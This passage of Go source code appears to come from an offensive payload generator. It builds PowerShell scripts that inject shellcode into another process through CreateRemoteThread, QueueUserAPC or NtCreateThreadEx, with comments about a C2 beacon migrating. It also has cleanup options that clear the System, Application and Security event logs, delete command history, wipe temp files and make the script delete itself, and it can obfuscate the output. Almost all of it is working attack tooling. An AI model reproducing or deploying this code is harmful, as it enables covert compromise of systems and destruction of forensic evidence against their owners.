    $hThread       = [IntPtr]::Zero
}
`, psQuoteDouble(opts.TargetProc), needSuspended)


	// --- Injection methods (unchanged logic, correct position) ---
	switch opts.InjectionMethod {
	case "CreateRemoteThread":
		script += `
Write-Host "[*] Using CreateRemoteThread injection..."

$shellMem = $PL::VirtualAllocEx($hProcess, [IntPtr]::Zero, [IntPtr]::new($shellcode.Length), 0x3000, 0x40)
if ($shellMem -eq [IntPtr]::Zero) { Write-Host "[!] VirtualAllocEx failed"; exit 1 }
Write-Host "[+] Allocated memory at 0x$($shellMem.ToString('X'))"

$bytesWritten = 0
$PL::WriteProcessMemory($hProcess, $shellMem, $shellcode, $shellcode.Length, [ref]$bytesWritten) | Out-Null
if ($bytesWritten -eq 0) { Write-Host "[!] WriteProcessMemory failed"; exit 1 }
Write-Host "[+] Wrote $bytesWritten bytes of shellcode"

$threadId = 0
$remoteThread = $PL::CreateRemoteThread($hProcess, [IntPtr]::Zero, [IntPtr]::Zero, $shellMem, [IntPtr]::Zero, 0, [ref]$threadId)
if ($remoteThread -eq [IntPtr]::Zero) { Write-Host "[!] CreateRemoteThread failed"; exit 1 }
Write-Host "[+] Shellcode thread created (TID: $threadId)"

# Wait up to 10s for shellcode thread to start executing before restoring EP
# This gives shellcode time to migrate/connect before the host process can exit
Write-Host "[*] Waiting for shellcode thread to initialize..."
Start-Sleep -Seconds 10

# Restore EP if we spawned the process (not needed for existing process)
if ($_spawnedNew -and $entryPoint -ne [IntPtr]::Zero) {
    $epBytesW2 = 0
    $PL::WriteProcessMemory($hProcess, $entryPoint, $originalBytes, 2, [ref]$epBytesW2) | Out-Null
    $PL::VirtualProtectEx($hProcess, $entryPoint, [IntPtr]::new(2), $oldProtect, [ref]$oldProtect) | Out-Null
    Write-Host "[+] Entry point restored"
}

Write-Host "[*] Waiting for shellcode thread to complete..."
$PL::WaitForSingleObject($remoteThread, [uint32]::MaxValue) | Out-Null

$PL::CloseHandle($remoteThread) | Out-Null
if ($hThread -ne [IntPtr]::Zero) { $PL::CloseHandle($hThread) | Out-Null }
$PL::CloseHandle($hProcess) | Out-Null

Write-Host "[+] Shellcode thread finished"
`

	case "QueueUserAPC":
		script += `
Write-Host "[*] Using QueueUserAPC injection..."

$shellMem = $PL::VirtualAllocEx($hProcess, [IntPtr]::Zero, [IntPtr]::new($shellcode.Length), 0x3000, 0x40)
if ($shellMem -eq [IntPtr]::Zero) { Write-Host "[!] VirtualAllocEx failed"; exit 1 }
Write-Host "[+] Allocated memory at 0x$($shellMem.ToString('X'))"

$bytesWritten = 0
$PL::WriteProcessMemory($hProcess, $shellMem, $shellcode, $shellcode.Length, [ref]$bytesWritten) | Out-Null
if ($bytesWritten -eq 0) { Write-Host "[!] WriteProcessMemory failed"; exit 1 }
Write-Host "[+] Wrote $bytesWritten bytes of shellcode"

if ($hThread -eq [IntPtr]::Zero) {
    Write-Host "[!] QueueUserAPC requires a suspended main thread (spawned-new path). Aborting."
    exit 1
}

$NT::NtQueueApcThread($hThread, $shellMem, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
Write-Host "[+] APC queued to main thread"

if ($_spawnedNew -and $entryPoint -ne [IntPtr]::Zero) {
    $epBytesW2 = 0
    $PL::WriteProcessMemory($hProcess, $entryPoint, $originalBytes, 2, [ref]$epBytesW2) | Out-Null
    $PL::VirtualProtectEx($hProcess, $entryPoint, [IntPtr]::new(2), $oldProtect, [ref]$oldProtect) | Out-Null
    Write-Host "[+] Entry point restored"
}

# Resume the suspended main thread so it transitions to alertable state
# and the queued APC actually fires.
$PL::ResumeThread($hThread) | Out-Null
Write-Host "[+] Main thread resumed - APC will fire on next alertable wait"

Write-Host "[*] Waiting for shellcode to complete..."
$PL::WaitForSingleObject($hThread, [uint32]::MaxValue) | Out-Null

$PL::CloseHandle($hThread) | Out-Null
$PL::CloseHandle($hProcess) | Out-Null

Write-Host "[+] Shellcode thread finished"
`

	case "NtCreateThreadEx":
		script += `
Write-Host "[*] Using NtCreateThreadEx injection..."

$shellMem = $PL::VirtualAllocEx($hProcess, [IntPtr]::Zero, [IntPtr]::new($shellcode.Length), 0x3000, 0x40)
if ($shellMem -eq [IntPtr]::Zero) { Write-Host "[!] VirtualAllocEx failed"; exit 1 }
Write-Host "[+] Allocated memory at 0x$($shellMem.ToString('X'))"

$bytesWritten = 0
$PL::WriteProcessMemory($hProcess, $shellMem, $shellcode, $shellcode.Length, [ref]$bytesWritten) | Out-Null
if ($bytesWritten -eq 0) { Write-Host "[!] WriteProcessMemory failed"; exit 1 }
Write-Host "[+] Wrote $bytesWritten bytes of shellcode"

$ntThread = [IntPtr]::Zero
$NT::NtCreateThreadEx([ref]$ntThread, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $shellMem, [IntPtr]::Zero, $true, 0, 0, 0, [IntPtr]::Zero) | Out-Null
if ($ntThread -eq [IntPtr]::Zero) { Write-Host "[!] NtCreateThreadEx failed"; exit 1 }
Write-Host "[+] Shellcode thread created (suspended)"

if ($_spawnedNew -and $entryPoint -ne [IntPtr]::Zero) {
    $epBytesW2 = 0
    $PL::WriteProcessMemory($hProcess, $entryPoint, $originalBytes, 2, [ref]$epBytesW2) | Out-Null
    $PL::VirtualProtectEx($hProcess, $entryPoint, [IntPtr]::new(2), $oldProtect, [ref]$oldProtect) | Out-Null
    Write-Host "[+] Entry point restored"
}

# Resume shellcode thread, then main thread (if we spawned suspended)
$PL::ResumeThread($ntThread) | Out-Null
Write-Host "[+] Shellcode thread resumed"

if ($hThread -ne [IntPtr]::Zero) {
    $PL::ResumeThread($hThread) | Out-Null
    Write-Host "[+] Main thread resumed"
}

# Wait for shellcode thread to complete (C2 beacon will migrate before returning)
Write-Host "[*] Waiting for shellcode thread to complete..."
$PL::WaitForSingleObject($ntThread, [uint32]::MaxValue) | Out-Null

$PL::CloseHandle($ntThread) | Out-Null
if ($hThread -ne [IntPtr]::Zero) { $PL::CloseHandle($hThread) | Out-Null }
$PL::CloseHandle($hProcess) | Out-Null

Write-Host "[+] Shellcode thread finished"
`

	default:
		script += "Write-Host '[!] No injection method selected'\n"
	}

	// Injection complete - each case handles its own wait/cleanup
	script += `
Write-Host "[+] Done, exiting..."
`

	if opts.CleanupMethod != "" {
		switch opts.CleanupMethod {
		case "selfDelete":
			script += `$me = $MyInvocation.MyCommand.Path; if ($me) { Start-Sleep 2; Remove-Item $me -Force -ErrorAction SilentlyContinue }
`
		case "clearEventLog":
			script += `
# Clear Event Logs
Clear-EventLog -LogName System -ErrorAction SilentlyContinue
Clear-EventLog -LogName Application -ErrorAction SilentlyContinue
Clear-EventLog -LogName Security -ErrorAction SilentlyContinue
`
		case "deleteHistory":
			script += `
# Delete Command History
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue
`
		case "wipeTemp":
			script += `
# Wipe Temp Files
Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $env:TMP\* -Recurse -Force -ErrorAction SilentlyContinue
`
		case "allCleanup":
			script += `
# Full Cleanup
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue
Clear-EventLog -LogName System -ErrorAction SilentlyContinue
Clear-EventLog -LogName Application -ErrorAction SilentlyContinue
Clear-EventLog -LogName Security -ErrorAction SilentlyContinue
Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $env:TMP\* -Recurse -Force -ErrorAction SilentlyContinue
$me = $MyInvocation.MyCommand.Path; if ($me) { Start-Sleep 2; Remove-Item $me -Force -ErrorAction SilentlyContinue }
`
		}
	}

	script = stripPSComments(script)

	if opts.Obfuscate {
		if opts.ObfuscationLevel == "extreme" {
			script = RandomizeVariables(script)
			script = ObfuscateScript(script)
		} else if opts.ObfuscationLevel == "advanced" {
			script = RandomizeVariables(script)
		} else {
			script = ObfuscateScript(script)
		}
	}

	return script, nil
}